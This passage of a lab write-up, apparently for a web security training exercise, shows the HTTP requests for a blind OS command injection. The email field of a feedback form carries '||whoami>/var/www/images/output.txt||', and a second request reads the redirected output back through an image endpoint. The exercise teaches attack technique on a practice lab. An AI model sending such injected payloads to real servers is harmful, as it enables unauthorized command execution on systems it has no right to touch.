# 7. Relevant HTTP Requests

## 7.1 Command Injection

```http
POST /feedback/submit HTTP/1.1
Host: <LAB-ID>.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

csrf=<CSRF_TOKEN>&name=Juan&email=||whoami>/var/www/images/output.txt||&subject=test&message=test
```

---

## 7.2 Retrieve the Output

```http
GET /image?filename=output.txt HTTP/1.1
Host: <LAB-ID>.web-security-academy.net
```

---

# 8. Proof of Concept (PoC)

Injected payload:

```bash
||whoami>/var/www/images/output.txt||
```

Resulting command executed by the operating system:

```bash
whoami > /var/www/images/output.txt
```

The output was then retrieved through:

```
/image?filename=output.txt
```

